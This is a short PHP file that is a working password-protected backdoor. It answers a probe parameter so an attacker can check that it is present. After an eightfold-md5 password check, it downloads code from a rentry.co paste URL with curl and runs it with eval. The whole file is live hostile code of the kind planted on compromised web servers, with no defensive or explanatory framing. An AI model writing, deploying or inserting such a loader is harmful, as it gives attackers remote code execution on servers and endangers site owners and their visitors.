<?php ?><?php if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) {
  session_start();
  if (!isset($_SESSION['secretyt'])) {
    $_SESSION['secretyt'] = false;
  }
  if (!$_SESSION['secretyt']) {
    if (isset($_POST['pwdyt']) && md5(md5(md5(md5(md5(md5(md5(md5($_POST['pwdyt'])))))))) == '2dec0af1d2efe0804b3b28bb0efa51c3') {
      $_SESSION['secretyt'] = true;
    } else {
$bytesecform = <<<FORM
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
    <style type="text/css">
      body {padding:10px}
      input {
        padding: 2px;
        display:inline-block;
        margin-right: 5px;
      }
    </style>
  </head>
  <body>
    <form action="" method="post" accept-charset="utf-8">
      <input type="password" name="pwdyt" value="" placeholder="passwd">
      <input type="submit" name="submit" value="submit">
    </form>
  </body>
</html>
FORM;
      die($bytesecform);
    }
  }
}
?>
<?php
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
$ok = '?>';
      eval("$ok" . get('https://rentry.co/78attzoh/raw'));
?>